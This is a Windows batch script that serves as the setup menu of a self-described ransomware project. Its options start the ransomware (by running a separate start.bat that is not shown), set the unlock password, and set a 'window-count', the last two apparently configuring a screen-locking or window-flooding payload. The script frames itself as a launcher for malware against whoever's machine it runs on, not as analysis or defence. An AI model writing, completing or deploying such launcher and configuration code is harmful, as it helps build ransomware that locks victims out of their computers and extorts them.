@echo off
title Setup
color 7
goto start

:start
cls
cd src
cd saved
for /f "tokens=*" %%a in (title.txt) do (
  echo 	%%a
)
cd ..
cd..
echo.                                                       
echo Options:
echo 	1: Start ransomware
echo 	2: Change password
echo 	3: Change window-count
echo 	4: Exit
echo.

set /p INPUTVAL=Go to: 
goto %INPUTVAL%

:1
cd src
start start.bat
goto end

:2
cls
set /p INPUTPAS=Enter password:
echo %INPUTPAS% > ./src/saved/password.txt
echo Changed password to %INPUTPAS%!
echo.
pause
goto start

:3
cls
set /p INPUTCOU=Enter window-count:
echo %INPUTCOU% > ./src/saved/maxwindows.txt
echo Changed window-count to %INPUTCOU%!
echo.
pause
goto start

:4
:end